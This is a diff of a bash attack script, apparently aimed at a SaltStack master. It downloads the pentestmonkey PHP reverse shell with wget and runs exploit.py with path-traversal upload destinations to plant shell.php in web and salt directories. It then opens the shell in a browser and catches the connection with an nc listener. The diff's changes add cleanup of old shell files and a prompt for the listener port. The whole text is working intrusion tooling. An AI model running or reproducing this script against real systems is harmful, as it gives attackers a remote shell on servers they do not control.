@@ -35,13 +35,20 @@ echo -e '\E[31;35m' "Most likely cannot ssh, you can try if you want, we are now
 echo -e '\E[31;40m' "RHOST Web Server Port?";tput sgr0
 read WPORT
 echo -e '\E[31;35m' "Downloading Pentestmonkey Reverse Shell";tput sgr0
+ls shell.php
+if [ $? = 0 ]; then
+	rm -rf shell.php*
+else
+	echo ""
+fi
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 mv php-reverse-shell.php shell.php
 nano shell.php
+echo -e '\E[31;40m' "LPORT (same one as you just put)"; tput sgr0
+read LPORT
 python3 exploit.py --master $RHOST -p $RPORT --upload-src shell.php --upload-dest "../../../../../../../../../var/www/html/shell.php"
 python3 exploit.py --master $RHOST -p $RPORT --upload-src shell.php --upload-dest "../../../../../../../../../var/www/shell.php"
 python3 exploit.py --master $RHOST -p $RPORT --upload-src shell.php --upload-dest "../../../../../../../../../srv/salt/shell.php"
 echo ""
 echo ""
-read -p "Start listener on host $LHOST and port $LPORT, press enter when ready"
 firefox http://$RHOST:$WPORT/shell.php && nc -lvnp $LPORT
